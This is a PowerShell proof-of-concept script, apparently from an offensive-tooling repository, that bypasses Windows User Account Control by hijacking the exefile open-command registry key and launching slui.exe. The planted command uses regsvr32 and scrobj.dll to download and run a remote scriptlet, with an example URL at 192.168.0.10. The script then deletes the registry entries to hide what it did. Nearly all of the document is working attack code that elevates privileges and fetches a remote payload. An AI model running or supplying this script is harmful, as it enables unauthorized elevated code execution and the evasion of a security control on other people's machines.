<#
.SYNOPSIS
	This script is a proof of concept to bypass the User Access Control (UAC) via SluiFileHandlerHijackLPE
.NOTES
	Function   : SluiHijackBypass
	File Name  : SluiHijackBypass.ps1
	Author     : Gushmazuko
.LINK
	https://github.com/
.EXAMPLE
	Load "regsvr32 -s -n -u -i:http://192.168.0.10/runner.cst scrobj.dll":
	SluiHijackBypass -http "http://192.168.0.10/runner.cst"
#>

function SluiHijackBypass(){
	Param (
	
		[String]$http
	)
	
	$program = "regsvr32 -s -n -u -i:$http scrobj.dll"

	#Create registry structure
	New-Item "HKCU:\Software\Classes\exefile\shell\open\command" -Force
	New-ItemProperty -Path "HKCU:\Software\Classes\exefile\shell\open\command" -Name "DelegateExecute" -Value "" -Force
	Set-ItemProperty -Path "HKCU:\Software\Classes\exefile\shell\open\command" -Name "(default)" -Value $program -Force

	#Perform the bypass
		#In Windows execution
		#Start-Process "C:\Windows\System32\slui.exe" -WindowStyle Hidden

		#Remote execution
		C:\Windows\Sysnative\cmd.exe /c C:\Windows\System32\slui.exe

	#Remove registry structure
	Start-Sleep 3
	Remove-Item "HKCU:\Software\Classes\exefile\shell\" -Recurse -Force
	
}
